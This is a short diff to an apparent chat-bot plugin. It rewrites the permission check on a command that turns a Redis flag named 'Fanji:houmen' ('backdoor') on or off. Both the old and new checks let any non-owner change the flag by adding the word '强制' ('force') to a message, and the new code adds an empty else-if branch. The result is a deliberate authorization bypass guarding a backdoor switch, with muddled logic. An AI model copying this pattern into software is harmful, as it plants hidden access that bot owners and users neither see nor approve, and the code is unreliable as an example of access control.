@@ -22,7 +22,12 @@ export class GetMaster extends plugin {
 
 
   async Masterkg(e) {
-    if (!e.isMaster && !e.msg.includes('强制')) return await e.reply('你没有权限');
+if (!e.isMaster) {  
+    if (!e.msg.includes('强制') && !cm.check(this.e.user_id)) {  
+        return await e.reply('你没有权限');  
+    } else if (e.msg.includes('强制') && cm.check(this.e.user_id)) {  
+    }  
+}  
     let open = e.msg.includes('开启');
     await redis.set('Fanji:houmen', open ? 'true' : 'false');
     await e.reply('设置完成');
